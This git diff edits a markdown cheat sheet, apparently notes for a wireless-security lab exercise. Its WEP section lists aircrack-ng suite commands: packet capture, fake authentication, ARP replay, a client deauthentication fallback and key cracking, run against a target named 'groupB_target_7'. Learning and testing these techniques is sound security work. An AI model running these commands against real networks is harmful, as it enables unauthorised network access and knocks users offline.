@@ -75,16 +75,23 @@ echo ${PINDB["0013F7"]}
 ```
 ## WEP Attack 
 https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
+** Capture packets ** 
 ```
-sudo airodump-ng wlan0mon
+(( 4 windows ))
+sudo airodump-ng wlan0mon -w output.cap
+
 sudo aireplay-ng -1 0 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
 -1 = fake auth, -e = essid, -a = bssid, -h = client mac
 sudo aireplay-ng -1 6000 -o 1 -q 10 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
 -1 6000 = fake auth every 6000 seconds, -o = send one packet at a time, -q = keep alive every 10 seconds
 if fails, deauth
 
+** Always do ARP replay ** 
 sudo aireplay-ng -3 -b 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
 -3 = ARP replay, -b = bssid, -h = client
+
+** If fake auth fails, do regular deauth **
+sudo aireplay-ng -0 0 -a [bssid] -c [clientmac] wlan0mon
 
 sudo aircrack-ng -b 9C:EF:D5:FB:07:AC wep.txt-01.cap
 Look for [H:E:X:K:E:Y]
